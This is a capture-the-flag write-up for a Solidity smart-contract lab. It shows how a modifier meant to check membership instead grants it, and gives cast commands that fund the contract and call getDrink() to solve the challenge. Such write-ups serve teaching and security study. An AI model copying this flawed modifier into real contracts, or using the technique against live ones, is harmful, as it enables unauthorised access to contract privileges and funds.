To solve the lab, we need to make *Setup::playerSolved()* return true. Here is the code.
&nbsp;  
&nbsp;  
```solidity
function solvedByPlayer() public {
    playerSolved = bar.beerGlass(msg.sender) >= 1 ? true : false;
}

function isSolved() public view returns(bool){
    return playerSolved;
}
```
&nbsp;  
We first need to call the *solvedByPLayer()* function, because that function will update the state of the *playerSolved()* bool. After that, we can just simply press the *Flag* button on the instance. Let's first look for a function that will modify *beerGlass*.
&nbsp;  
&nbsp;  
```solidity
function register() public payable isHuman{
    // You can register here, but still need the Onwer to add you in.
    require(msg.value >= 1e18, "Need 1 ether deposit.");
    balance[msg.sender] += msg.value;
}

function addMember(address _addMember) public isHuman onlyOwner(_addMember){
    require(balance[_addMember] > 0, "You need to deposit some money to become a member.");
    barMember[_addMember] = true;
}

function getDrink() public isHuman onlyMember{
    require(balance[msg.sender] > 0, "You need to deposit some money.");
    require(barMember[msg.sender] == true);
    beerGlass[msg.sender]++;
}
```
&nbsp;  
We have some options. There are *register()*, *addMember()*, and *getDrink()*; based on what we need, we have to call *getDrink()*, but there is a modifier called *onlyMember* and *isHuman*, plus we need our balance to be greater than zero. From the function alone, what we can tell is that to become a member, the *owner* must add the member manually by calling the *addMember()*; we can still call *register()* with the value 1 ether. Let's look at the rest of the code now. &nbsp;  
&nbsp;  
```solidity
modifier isHuman(){
    require(msg.sender == tx.origin, "Only Human Allowed in this Bar!");
    _;
}

modifier onlyOwner(address _addMember) {
    require(owner == msg.sender, "Only Owner can add Member!");
    _;
}

modifier onlyMember() {
    barMember[msg.sender] = true;
    _;
}

receive() external payable{
    balance[msg.sender] += msg.value;
}
```
&nbsp;  
There are 3 modifiers that exist in the contract. The *isHuman()* modifier ensures that the *msg.sender* is the same as *tx.origin*, meaning only EOA can interact with the contract. The *onlyOwner()* has 1 parameter, which is *_addMember*. Now *onlyMember()* modifier is quite different than another modifier, instead of ensuring a condition, it actually sets a condition, especially *msg.sender*; it sets the *barMember[msg.sender]* to become true, this is clearly a flaw by the developer. &nbsp;  
&nbsp;  
Earlier we knew that the *getDrink()* function used this modifier. This means what left now is giving ourselves some balance either by calling the *register()* function or directly sending the contract some balance because it has *receive() external payable* defined there and directly adds the amount to our balance. Okay then, the solution should be &nbsp;  
&nbsp;  
```bash
// get the bar contract address
cast call -r $RPC_URL $SETUP_ADDR "bar()"

// send some money to the contract
cast send -r $RPC_URL --private-key $PK $BAR_ADDR --value 1ether

// get ourselves some drink
cast send -r $RPC_URL --private-key $PK $BAR_ADDR "getDrink()"

// call setup.sol::solvedByPlayer()
cast send -r $RPC_URL --private-key $PK $SETUP_ADDR "solvedByPlayer()"
```
&nbsp;  
After that we just need to click Flag, and we should've solved the lab.